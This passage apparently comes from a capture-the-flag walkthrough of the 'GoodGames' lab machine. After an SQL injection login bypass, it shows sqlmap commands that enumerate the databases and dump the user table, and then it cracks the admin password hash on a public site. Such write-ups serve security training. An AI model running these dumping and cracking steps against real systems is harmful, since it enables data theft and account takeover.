After detecting a valid SQL injection for an authentication bypass, we go to the settings icon at the top of the webpage an we found the following

![alt text](Images/Browser5.png)

So we add this url to our etc/host becasuse we are on front to the virtual host.

![alt text](Images/VHost.png)

We try to click anothertime to settings button to reload the page

![alt text](Images/Browser6.png)

We change the email back to admin@goodgames.htb and save the request to a file called goodgames.req . Use SQLMap enumerate the database.

![alt text](Images/BurpSuite4.png)
```bash
$ sqlmap -r goodgames.req
```
![alt text](Images/SQLMap.png)

![alt text](Images/SQLMap2.png)

Enumerate the database and tables to identify any sensitive information stored in the database.
```bash
$ sqlmap -r goodgames.req --dbs
```
![alt text](Images/SQLMap3.png)

Enumerate the database named main by extracting the table names.
```bash
$ sqlmap -r goodgames.req -D main --tables
```

![alt text](Images/SQLMap4.png)

Extract all the data from the user table.
```bash
$ sqlmap -r goodgames.req -D main -T user --dump
```
![alt text](Images/SQLMap5.png)

Disclosed is an admin's password hash. → https://crackstation.net/

![alt text](Images/Browser7.png)

Now we can login the last web page.

![alt text](Images/Browser8.png)




[Back](README.md)